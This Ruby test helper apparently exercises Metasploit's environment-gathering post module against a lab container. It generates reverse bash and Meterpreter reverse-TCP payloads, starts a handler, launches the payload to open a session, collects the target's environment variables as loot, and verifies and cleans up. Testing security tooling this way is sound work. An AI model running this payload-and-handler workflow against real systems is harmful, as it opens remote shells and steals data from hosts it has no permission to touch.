# frozen_string_literal: true

require_relative '../rsync_creds/native'

# Reuses genuine callback, console, reporting and resource controls unchanged.
module GenericEnvironmentTarget
  include RsyncCredentialTarget

  def rc_owner
    'post/multi/gather/env'
  end

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'generic-environment.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def ge_native(phase)
    output, = rc_command(phase + '-state', 'linux', 'python3', '/opt/state.py')
    state = JSON.parse(output)
    expect(state.values_at('hostname', 'uid')).to eq(['module-target-env', 0])
    controls = []
    %w[root labuser].each do |actor|
      %w[standard large].each do |variant|
        output, = rc_command(phase + '-' + actor + '-' + variant, 'linux', 'python3', '/opt/native_probe.py', 'control', actor, variant)
        data = JSON.parse(output)
        controls << data
        expect(data.values_at('native_passed', 'exit', 'process_absent')).to eq([true, 0, true])
      end
    end
    @rc.fetch(:native) << { phase: phase, state: state, controls: controls }
    rc_save
    state
  end

  def ge_install(variant = 'standard')
    @ge_case = { variant: variant }
    @rc.fetch(:cases) << @ge_case
    output, = rc_command('install-' + variant, 'linux', 'python3', '/opt/native_probe.py', 'case', variant)
    @ge_case[:native] = JSON.parse(output)
    rc_save
    expect(@ge_case.fetch(:native).fetch('present')).to be(true)
  end

  def ge_restore
    return unless @ge_case

    output, = rc_command('restore-environment', 'linux', 'python3', '/opt/native_probe.py', 'restore', @ge_case.fetch(:variant))
    @ge_case[:recovery] = JSON.parse(output)
    rc_save
    expect(@ge_case.fetch(:recovery).fetch('absent')).to be(true)
    @ge_case = nil
  end

  def ge_channels
    rc_json("begin;s=framework.sessions.fetch(#{@session.fetch('id')});s.type=='meterpreter' ? s.channels.keys.sort : [];end")
  end

  def ge_descendants
    output, = rc_command('session-descendants', 'linux', 'python3', '/opt/descendants.py', @identity.fetch('pid').to_s)
    JSON.parse(output).fetch('descendants')
  end

  def ge_session(kind, label, actor = 'root')
    @actor_uid = actor == 'root' ? 0 : 1001
    @workspace = "ge_#{Process.pid}_#{kind}_#{label}"
    expect(console_command('workspace -a ' + @workspace)).to include(@workspace)
    expect(rc_json('framework.sessions.keys')).to eq([])
    callback = @rc.fetch(:callback)
    socket = TCPServer.new(callback.fetch(:bind), 0)
    port = socket.local_address.ip_port
    socket.close
    @delivery = if kind == 'shell'
                  { payload: 'cmd/unix/reverse_bash', file: 'shell-session.sh', format: 'raw' }
                else
                  { payload: 'linux/x64/meterpreter_reverse_tcp', file: 'meterpreter-session.elf', format: 'elf' }
                end
    console_command('back')
    console_command('use payload/' + @delivery.fetch(:payload))
    console_command("set LHOST #{callback.fetch(:host)}")
    console_command("set LPORT #{port}")
    console_command('set MeterpreterTryToFork false') if kind == 'meterpreter'
    if kind == 'shell'
      console_command('set BashPath /bin/bash')
      console_command('set ShellPath /bin/sh')
      console_command('set FD 120')
    end
    file = File.join(target_runtime.fetch('artifacts'), @delivery.fetch(:file))
    generated = console_command("generate -f #{@delivery.fetch(:format)} -o #{file}")
    expect(generated).not_to match(/\[-\]|Error|Exception/)
    expect(File.binread(file)).to start_with(kind == 'shell' ? '/bin/bash -c ' : "\x7fELF")
    @payload_sha = Digest::SHA256.file(file).hexdigest
    arguments = target_runtime.fetch('compose') + ['cp', file, 'linux:/opt/module-target-artifacts/' + @delivery.fetch(:file)]
    copied, status = Open3.capture2e(*arguments)
    @rc.fetch(:commands) << { label: 'copy-payload', argv: arguments, exit: status.exitstatus, stdout_base64: Base64.strict_encode64(copied.b) }
    expect(status.success?).to be(true), copied
    console_command('back')
    console_command('use exploit/multi/handler')
    console_command('set PAYLOAD ' + @delivery.fetch(:payload))
    console_command("set LHOST #{callback.fetch(:host)}")
    console_command("set LPORT #{port}")
    console_command("set ReverseListenerBindAddress #{callback.fetch(:bind)}")
    console_command('set MeterpreterTryToFork false') if kind == 'meterpreter'
    console_command('set ExitOnSession false')
    console_command('run -j')
    rc_poll do
      console_command('jobs')
      console.all_data.include?("Started reverse TCP handler on #{callback.fetch(:bind)}:#{port}")
    end
    output, = rc_command('launch-' + label, 'linux', 'python3', '/opt/launch_session.py', '/opt/module-target-artifacts/' + @delivery.fetch(:file), actor)
    @launch = JSON.parse(output)
    output, = rc_command('launcher-identity', 'linux', 'python3', '/opt/process-state.py', 'identity', @launch.fetch('pid').to_s)
    @launch_identity = JSON.parse(output)
    @session = rc_poll(60) do
      rows = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,platform:s.platform,host:s.session_host,db_id:s.db_record&.id}}')
      event = kind == 'shell' ? 'Command shell' : 'Meterpreter'
      rows.find { |row| row.fetch('type') == kind && row['db_id'] && console.all_data.include?("#{event} session #{row.fetch('id')} opened") }
    end
    @channels_baseline = ge_channels
    @proof_path = "/tmp/module-target-druid-session-#{Process.pid}_#{@session.fetch('id')}-#{@session.fetch('id')}"
    if kind == 'meterpreter'
      command = 'execute -f /usr/bin/touch -a ' + @proof_path
      response = console_command("sessions -i #{@session.fetch('id')} -C #{command.inspect}")
      expect(response).not_to match(/\[-\]|Exception|Unknown command/)
      rc_poll do
        _, code = rc_command('wait-for-marker', 'linux', 'test', '-f', @proof_path, required: false)
        code.zero?
      end
      proof = rc_json("begin;s=framework.sessions.fetch(#{@session.fetch('id')});{id:#{@session.fetch('id')},type:s.type,pid:s.sys.process.getpid,identity:s.sys.config.getuid,expected:''};end")
    else
      proof = rc_json("DruidSessionControl.proof(framework,#{@session.fetch('id')},#{@proof_path.inspect})")
    end
    expect(proof).not_to have_key('error')
    @proof_sha = Digest::SHA256.hexdigest(proof.fetch('expected'))
    output, = rc_command('session-identity', 'linux', 'python3', '/opt/process-state.py', 'identity', proof.fetch('pid').to_s)
    @identity = JSON.parse(output)
    expect(@identity.values_at('alive', 'uid')).to eq([true, @actor_uid])
    expect(@identity.fetch('state')).not_to eq('Z')
    output, = rc_command('process-environment', 'linux', 'python3', '/opt/native_probe.py', 'process', proof.fetch('pid').to_s, actor, @ge_case.fetch(:variant))
    @process_environment = JSON.parse(output)
    row = { label: label, kind: kind, actor: actor, session: @session, launch: @launch, launcher_identity: @launch_identity, proof: proof, identity: @identity, process_environment: @process_environment, payload_sha256: @payload_sha, initial_channels: @channels_baseline }
    @rc.fetch(:sessions) << row
    rc_save
    expect(@process_environment.fetch('native_passed')).to be(true)
    @expected_environment = @process_environment.fetch('selected_base64')
    if kind == 'meterpreter'
      # /proc exposes initial execve values. Mettle may subsequently change
      # PATH/LANG; use its independent native getenv RPC for current values.
      names = @expected_environment.keys + ['LANG']
      live = rc_json("begin;require 'base64';s=framework.sessions.fetch(#{@session.fetch('id')});s.sys.config.getenvs(*#{names.inspect}).transform_values{|value|Base64.strict_encode64(value.b)};end")
      row[:runtime_environment] = live
      @expected_environment.each do |key, encoded|
        expect(live.fetch(key)).to eq(encoded) unless key == 'PATH'
      end
      expect(Base64.strict_decode64(live.fetch('PATH'))).to start_with(Base64.strict_decode64(@expected_environment.fetch('PATH')))
      @expected_environment = live
      rc_save
    end
    uid, = rc_command('proof-uid', 'linux', 'stat', '-c', '%u', @proof_path)
    expect(uid.strip.to_i).to eq(@actor_uid)
    console_command('back')
    console_command('use ' + rc_owner)
    console_command("set SESSION #{@session.fetch('id')}")
    source = rc_json('begin;source="modules/post/multi/gather/env.rb";{sha256:Digest::SHA256.file(source).hexdigest,source:active_module.method(:run).source_location};end')
    @rc.fetch(:sources) << source
    rc_save
    expect(source.fetch('sha256')).to eq(Digest::SHA256.file('modules/post/multi/gather/env.rb').hexdigest)
    expect(File.realpath(source.fetch('source').first)).to eq(File.realpath('modules/post/multi/gather/env.rb'))
  end

  def ge_reports
    expect(@workspace).to match(/\Age_\d+_[a-z_]+\z/)
    rows = JSON.parse(rc_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT l.id,l.ltype,l.content_type,l.path,host(h.address::inet) AS address
        FROM loots l JOIN workspaces w ON w.id=l.workspace_id
        LEFT JOIN hosts h ON h.id=l.host_id WHERE w.name='#{@workspace}'
      ) row
    SQL
    rows.each do |row|
      path = File.realpath(row.fetch('path'))
      expect(path).to start_with(File.realpath(ENV.fetch('MSF_CFGROOT_CONFIG')) + '/loot/')
      row['base64'] = Base64.strict_encode64(File.binread(path))
      row['sha256'] = Digest::SHA256.file(path).hexdigest
    end
    cores = rc_sql("SELECT count(*) FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id WHERE w.name='#{@workspace}'").strip.to_i
    @rc.fetch(:reports) << { workspace: @workspace, loot: rows, credential_cores: cores }
    rc_save
    expect(cores).to eq(0)
    rows
  end

  def ge_call(label)
    prior = ge_reports.map { |row| row.fetch('id') }
    call = { label: label, session: @session, variant: @ge_case.fetch(:variant), expected: @expected_environment, channels_before: ge_channels }
    @rc.fetch(:calls) << call
    rc_save
    run_target_module(rc_owner, 'linux', { 'SESSION' => @session.fetch('id') }, endpoint_options: {}, reuse_module: true, allow_errors: true, command_timeout: 120) do |output|
      call[:output_base64] = Base64.strict_encode64(output.b)
      call[:returned] = true
      call[:loot] = ge_reports.reject { |row| prior.include?(row.fetch('id')) }
      call[:channels_after] = ge_channels
      call[:descendants_after] = ge_descendants
      call[:module_id] = rc_json('active_module.object_id')
      rc_save
    end
    call
  end

  def ge_values(raw)
    # Fixture-specific continuation parsing: the controlled multiline value has
    # no variable-looking line. This is not a general environment-file parser.
    text = raw.b.delete_suffix("\n")
    matches = []
    text.to_enum(:scan, /(?:\A|\n)([A-Za-z_][A-Za-z0-9_]*)=/).each do
      match = Regexp.last_match
      matches << [match[1], match.begin(0), match.end(0)]
    end
    values = {}
    matches.each_with_index do |(key, _start, offset), index|
      expect(values).not_to have_key(key)
      finish = index + 1 < matches.length ? matches[index + 1][1] : text.bytesize
      values[key] = text.byteslice(offset, finish - offset)
    end
    values
  end

  def ge_verify(call)
    expect(call.fetch(:returned)).to be(true)
    expect(call.fetch(:loot).length).to eq(1)
    row = call.fetch(:loot).first
    expect(row.values_at('ltype', 'content_type', 'address')).to eq(['unix.environment', 'text/plain', call.fetch(:session).fetch('host')])
    raw = Base64.strict_decode64(row.fetch('base64'))
    values = ge_values(raw)
    output = Base64.strict_decode64(call.fetch(:output_base64))
    call.fetch(:expected).each do |key, encoded|
      value = Base64.strict_decode64(encoded)
      expect(values.fetch(key)).to eq(value)
      expect(output.b).to include((key + '=').b + value)
    end
    expect(output).to include('Results saved to ' + row.fetch('path'))
    expect(call.fetch(:channels_after)).to eq(call.fetch(:channels_before))
    expect(call.fetch(:descendants_after)).to eq([])
  end

  def ge_cleanup
    return unless @session

    row = { session: @session }
    @rc.fetch(:cleanup) << row
    if @session.fetch('type') == 'meterpreter'
      identifiers = ge_channels - @channels_baseline
      row[:closed_owned_channels] = rc_json("begin;s=framework.sessions.fetch(#{@session.fetch('id')});ids=#{identifiers.inspect};ids.each{|id|channel=s.channels[id];channel.close if channel};{requested:ids,remaining:s.channels.keys.sort};end")
    else
      row[:channels_not_applicable] = true
    end
    descendants = ge_descendants
    row[:request] = rc_json("DruidSessionControl.exit_remote(framework,#{@session.fetch('id')})")
    output, = rc_command('stop-session', 'linux', 'python3', '/opt/process-state.py', 'stop', JSON.generate(@identity))
    row[:process] = JSON.parse(output)
    if @launch_identity.fetch('pid') != @identity.fetch('pid')
      output, = rc_command('stop-launcher', 'linux', 'python3', '/opt/process-state.py', 'stop', JSON.generate(@launch_identity))
      row[:launcher_process] = JSON.parse(output)
    end
    row[:descendants] = descendants.sort_by { |item| -item.fetch('depth') }.map do |identity|
      output, = rc_command('stop-owned-descendant', 'linux', 'python3', '/opt/process-state.py', 'stop', JSON.generate(identity))
      JSON.parse(output)
    end
    console_command("sessions -k #{@session.fetch('id')}") if rc_json('framework.sessions.keys').include?(@session.fetch('id'))
    rc_poll { !rc_json('framework.sessions.keys').include?(@session.fetch('id')) }
    rc_poll { rc_sql("SELECT closed_at IS NOT NULL FROM sessions WHERE id=#{@session.fetch('db_id')}").strip == 't' }
    console_command('jobs -K')
    output, = rc_command('remove-owned-artifacts', 'linux', 'python3', '/opt/artifacts.py', @actor_uid.to_s, @delivery.fetch(:file), @payload_sha, @proof_path, @proof_sha)
    row[:artifacts] = JSON.parse(output)
    row[:database_session_closed] = true
    rc_save
  ensure
    @session = @launch = @launch_identity = @identity = @delivery = @payload_sha = @proof_path = @proof_sha = @channels_baseline = nil
    rc_save
  end
end
